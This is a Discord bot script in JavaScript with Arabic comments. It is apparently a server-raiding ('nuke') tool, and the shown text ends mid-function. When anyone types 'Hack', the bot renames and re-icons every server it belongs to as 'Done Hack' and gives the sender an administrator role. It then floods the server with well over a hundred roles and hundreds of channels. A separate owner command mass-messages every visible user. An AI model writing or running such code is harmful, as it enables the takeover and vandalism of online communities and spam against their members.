const Discord = require("discord.js");
const client = new Discord.Client();
var prefix = '+'


client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
});

client.on('message', async message => {
if(message.content.startsWith(prefix + "bcall")) {
  let i = client.users.size;
  if(message.author.id !== '321476121956974595') return message.channel.send('❎ » هذا الأمر مخصص لصاحب البوت فقط');
  var args = message.content.split(' ').slice(1).join(' ');
  if(!args) return message.channel.send('❎ » يجب عليك كتابة الرسالة')
  setTimeout(() => {
    message.channel.send(`تم الارسال لـ ${i} شخص`)
  }, client.users.size * 500);
  client.users.forEach(s => {
    s.send(args).catch(e => i--);
  });
}
});











var x_x = "Hack" //هنا تحط الامر اللي يشغل الهاك

//اسم البوت واسم السيرفر وصورهم وكل شئ

client.on('message', message => {
 if (message.content === x_x) {
  client.user.setAvatar(`https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png`)

 }
});
client.on('message', message => {
 if (message.content === x_x) {
  client.user.setUsername("اسفين اذا عورناك")

 }
});
client.on('message', message => {
 if (message.content === x_x) {
  client.user.setGame(`اسفين اذا عـورناك`, 'https://www.twitch.tv/hix')

 }
});

client.on('message', message => {
 if (message.content === x_x) {
  client.guilds.forEach(m => {
   m.setIcon(`https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png`)
  })
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  client.guilds.forEach(m => {
   m.setName(`Done Hack`)
  })
 }
});

client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;

  message.guild.setIcon(`https://cdn.discordapp.com/attachments/514072139200987156/544508993113161728/9k.png`)

 }
});




//اللي يسوي رتب

client.on('message', message => {
 if (!message.channel.guild) return;

 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createRole({
   name: "Done Hack",
   permissions: [8],
   color: "#23272a"
  }).then(function(role) {
   message.member.addRole(role);
  })
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });


 }
});




//هنا اللي يسوي الرومات
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');
  message.guild.createChannel('اـثبات وجـود', 'text');
  message.guild.createChannel('اـثبات وجـود', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
